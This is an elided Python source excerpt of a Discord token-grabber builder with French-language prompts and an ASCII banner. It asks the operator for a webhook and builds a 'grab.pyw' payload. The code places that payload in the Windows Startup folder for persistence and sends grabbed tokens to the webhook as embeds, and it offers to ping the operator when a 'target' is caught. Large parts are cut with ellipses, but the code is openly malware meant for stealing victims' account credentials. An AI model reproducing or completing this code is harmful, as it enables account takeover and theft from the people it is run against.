...
path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/grab.pyw" % getenv("userprofile")
...
class Grab:
    ...
    def token_grab(token: str):
        ...
        data = [{
            "title": "Grab",
            "description": "Grabbed!",
            "url": "https://github.com/ItzScream",
            "image": {
...
ready_data = [{
    ...
    "fields": [
        {
            "name": "**Prêt!**",
            "value": 'Allons trouver des tokens',
            "inline": True
        }
    ],
...
class Build(Riot, Scarecrow, Kramer):
    def __init__(self, webhook: str, ping: bool) -> None:
        self.file, self.webhook, self.ping, self.content, self.key = "build/grab.pyw", webhook, ping, ..., ...
        self.build()
        return None
...
banner1 = """
      ....        .                                  ..    
   .x88" `^x~  xH(`                            . uW8"      
  X888   x8 ` 8888h      .u    .               `t888       
 88888  888.  %8888    .d88B :@8c        u      8888   .   
<8888X X8888   X8?    ="8888f8888r    us888u.   9888.z88N  
X8888> 488888>"8888x    4888>'88"  .@88 "8888"  9888  888E 
X8888>  888888 '8888L   4888> '    9888  9888   9888  888E 
?8888X   ?8888>'8888X   4888>      9888  9888   9888  888E 
 8888X h  8888 '8888~  .d888L .+   9888  9888   9888  888E 
  ?888  -:8*"  <888"   ^"8888*"    9888  9888  .8888  888" 
   `*88.      :88%        "Y"      "888*""888"  `%888*%"   
      ^"~====""`                    ^Y"   ^Y'      "`      
"""
...
def main():
    ...
    print('\n'*3)
    webhook = Write.Input("Entrez votre webhook -> ", 
            Colors.green, interval=0.005, input_color=Colors.white)

    if not webhook.strip():
        Colorate.Error("Veuillez entrer un webhook valide !")
        return

    ping = Write.Input("Voulez-vous être mentionné lorsque vous avez attrapé une cible ? [y/n] -> ", 
            Colors.green, interval=0.005, input_color=Colors.white)
    
    if ping not in ('y', 'n'):
        Colorate.Error("Veuillez entrer 'y' ou 'n'!")
        return
    ...
    print()
    Write.Input("Fini!", Colors.green, interval=0.005)
    return exit()
